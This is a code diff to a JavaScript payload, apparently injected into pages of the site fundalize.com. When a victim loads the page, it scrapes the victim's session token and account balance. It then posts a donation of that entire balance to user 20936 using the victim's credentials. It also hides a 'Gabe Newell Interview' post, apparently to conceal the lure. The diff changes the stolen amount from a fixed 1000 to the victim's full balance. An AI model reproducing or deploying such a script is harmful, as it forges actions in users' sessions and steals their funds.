@@ -1,6 +1,7 @@
 var xhttp2 = new XMLHttpRequest();
 var response;
 var SID;
+var fndlz;
 
 xhttp2.open('GET', 'http://www.fundalize.com/includes/pop_donate.php?&to=20936', true);
 xhttp2.onreadystatechange=(e)=>{
@@ -14,11 +15,14 @@ xhttp2.onreadystatechange=(e)=>{
 	}
 }
 xhttp2.send('');
-
+$( "div:contains('Gabe Newell Interview')" ).parents().eq(3).css("display", "none");
 function getSID(){
 	var position = response.search(".value") + 8;
 	var endposition = response.search("',document");
 	SID = response.substring(position, endposition);
+	var positionfndlz = response.search("Je hebt") + 9;
+	var endpositionfndlz = response.search(" IT EUROS");
+	fndlz = response.substring(positionfndlz, endpositionfndlz);
 }
 
 
@@ -27,7 +31,7 @@ function step2(){
 	xhttp.open('POST', 'http://www.fundalize.com/includes/ajax_useractions.php', true);
 	xhttp.withCredentials = true;
 	var cookies = document.cookie;
-	var params = 'uid=20936&pid='+user_id+'&amount=1000&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
+	var params = 'uid=20936&pid='+user_id+'&amount='+fndlz+'&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
 	//console.log('User ID: ' + user_id);
 	//console.log('SID: ' + SID);
 	
@@ -40,8 +44,8 @@ function step2(){
 	
 	xhttp.onreadystatechange=(e)=>{
 		if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
-			//console.log('done');
-			step3();
+			console.log('done');
+			//step3();
 		}
 		else{
 			//console.log('fail');
@@ -50,7 +54,6 @@ function step2(){
 }
 function step3(){
 	$( "div:contains('Gabe Newell Interview')" ).parents().eq(3).css("display", "none");
-	//console.log('done');
 }
 function getCookie(cname) {
 var name = cname + "=";
